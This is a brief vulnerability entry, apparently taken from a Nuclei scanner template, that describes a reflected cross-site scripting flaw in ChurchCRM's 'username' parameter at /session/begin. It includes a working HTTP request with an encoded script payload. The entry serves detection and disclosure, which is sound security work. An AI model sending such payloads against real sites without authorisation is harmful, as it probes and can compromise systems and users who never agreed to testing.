# Vulnerability: ChurchCRM - Cross-Site Scripting
**Classification:** CWE-80
**Source:** Nuclei Template (`churchcrm-xss.yaml`)

## Description
A reflected cross-site scripting (XSS) vulnerability was discovered in ChurchCRM via the 'username' parameter in /session/begin.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/session/begin?username=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
```

